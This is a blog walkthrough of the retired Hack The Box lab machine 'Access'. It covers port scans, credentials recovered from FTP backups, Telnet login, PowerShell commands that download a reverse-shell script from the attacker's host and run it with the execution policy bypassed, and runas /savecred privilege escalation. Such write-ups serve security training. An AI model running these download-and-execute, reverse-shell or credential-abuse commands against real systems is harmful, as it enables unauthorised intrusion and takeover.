---
layout: post
title: "Access: Hack The Box Walkthrough"
date: 2019-03-03 04:43:45 +0000
last_modified_at: 2019-03-03 04:46:16 +0000
category: Walkthrough
tags: ["Hack The Box", Access, retired]
comments: true
image:
  feature: access-htb-walkthrough.jpg
  credit: Pexels / Pixabay
  creditlink: https://pixabay.com/en/dark-door-door-handle-light-open-1852985/
---

This post documents the complete walkthrough of Access, a retired vulnerable [VM][1] created by [egre55][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Access is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.98 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-09 10:37:40 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.98
Discovered open port 23/tcp on 10.10.10.98
Discovered open port 21/tcp on 10.10.10.98
```

`masscan` finds three open ports: `21/tcp`, `23/tcp` and `80/tcp`. Let's do one better with `nmap` scanning these discovered ports.

```
# nmap -n -v -Pn -p21,23,80 -A --reason -oN nmap.txt 10.10.10.98
...
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet? syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
```

Since anonymous FTP is allowed, let's check it out first.


{% include image.html image_alt="ee418d6f.png" image_src="/7fed0dbf-8034-4ae6-9c37-204415d681a3/ee418d6f.png" %}


There's a huge file in the `Backups` directory—`backup.mdb`. It appears to be a Microsoft Access Jet Database (MDB) file.


{% include image.html image_alt="0ce46389.png" image_src="/7fed0dbf-8034-4ae6-9c37-204415d681a3/0ce46389.png" %}


There's also a big file—`Access Control.zip`, in the `Engineers` directory.


{% include image.html image_alt="ea05e083.png" image_src="/7fed0dbf-8034-4ae6-9c37-204415d681a3/ea05e083.png" %}


The archive file is password-protected and it appears to contain a Personal Storage Table (PST) file in it.

### Microsoft Office

I know there are Linux tools to read MDB and PST files but for the sake of convenience, let's use Microsoft Office to open them. I'll use Microsoft Access to read the MDB file. Here's what I found in the `auth_user` table.


{% include image.html image_alt="access.png" image_src="/7fed0dbf-8034-4ae6-9c37-204415d681a3/access.png" %}


The password `access4u@security` is the one to extract the PST file from the archive. I'll use Microsoft Outlook to read the PST file. There's only one email in the mailbox.


{% include image.html image_alt="outlook.png" image_src="/7fed0dbf-8034-4ae6-9c37-204415d681a3/outlook.png" %}


Another credential (`security:4Cc3ssC0ntr0ller`) in the bag!

### Telnet

Let's give the credential a shot with the Telnet service.


{% include image.html image_alt="16c6c1e1.png" image_src="/7fed0dbf-8034-4ae6-9c37-204415d681a3/16c6c1e1.png" %}


Awesome.

The file `user.txt` is at `security`'s desktop.


{% include image.html image_alt="0c8d6cb5.png" image_src="/7fed0dbf-8034-4ae6-9c37-204415d681a3/0c8d6cb5.png" %}


## Privilege Escalation

Telnet is painfully slow. Let's run a reverse shell in PowerShell. First of all, let's write a `wget` script in PowerShell. Note that this system is running Windows Server 2008. As such, only PowerShell 2.0 is available. Echo the following lines to `C:\Users\security\Downloads\wget.ps1`.

```powershell
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile($Args[0],$Args[1])
```


{% include image.html image_alt="7638e0eb.png" image_src="/7fed0dbf-8034-4ae6-9c37-204415d681a3/7638e0eb.png" %}


Next, generate a reverse shell in PowerShell with `msfvenom` like so.


{% include image.html image_alt="bfe9f363.png" image_src="/7fed0dbf-8034-4ae6-9c37-204415d681a3/bfe9f363.png" %}


Run the following commands in the `telnet` session to transfer `rev.ps1` over.

```
powershell -ExecutionPolicy Bypass -File wget.ps1 http://10.10.12.246/rev.ps1 rev.ps1
```

Now, we can execute the reverse shell with the following command.

```
powershell -ExecutionPolicy Bypass -NoExit -File rev.ps1
```

The `-NoExit` switch indicates that we don't want to exit from the thread. We should get a reverse shell in our `nc` listener.


{% include image.html image_alt="5f59bc8d.png" image_src="/7fed0dbf-8034-4ae6-9c37-204415d681a3/5f59bc8d.png" %}


During enumeration of `security`'s account, I ran the `cmdkey` command to list the stored credentials in the box and this is what I saw.


{% include image.html image_alt="d1e7b1c4.png" image_src="/7fed0dbf-8034-4ae6-9c37-204415d681a3/d1e7b1c4.png" %}


Perfect. This means that I can use the `/savecred` switch in `runas` to impersonate Administrator without knowing the password! Now, let's claim the prize with the following command:

```
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Downloads\root.txt"
```


{% include image.html image_alt="6874f21f.png" image_src="/7fed0dbf-8034-4ae6-9c37-204415d681a3/6874f21f.png" %}


:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/156
[2]: https://www.hackthebox.eu/home/users/profile/1190
[3]: https://www.hackthebox.eu/
